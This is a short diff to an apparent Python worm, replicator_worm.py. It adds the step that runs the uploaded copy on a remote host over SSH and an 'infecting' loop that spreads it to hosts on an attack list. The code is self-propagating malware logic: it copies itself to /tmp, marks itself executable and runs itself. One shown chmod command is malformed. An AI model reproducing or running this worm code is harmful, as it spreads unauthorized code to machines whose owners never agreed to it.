@@ -78,7 +78,8 @@ def spreadAndExecute(sshClient):
 	# MIG: Changed this one to the SFTP client
 	sftpClient.put("replicator_worm.py","/tmp/"+"replicator_worm.py")
 	sshClient.exec_command("chmod a+x python /tmp/replicator_worm.py")
-
+	sshClient.exec_command("python /tmp/replicator_worm.py")
+	
 
 ############################################################
 # Try to connect to the given host given the existing
@@ -341,5 +342,7 @@ for host in attackList:
 		except:
 			print("inside if isInfectedSytem() statement ")
 			spreadAndExecute(sshInfo[0])
-	
+			print("done infecting")
+			exit()
+			
 
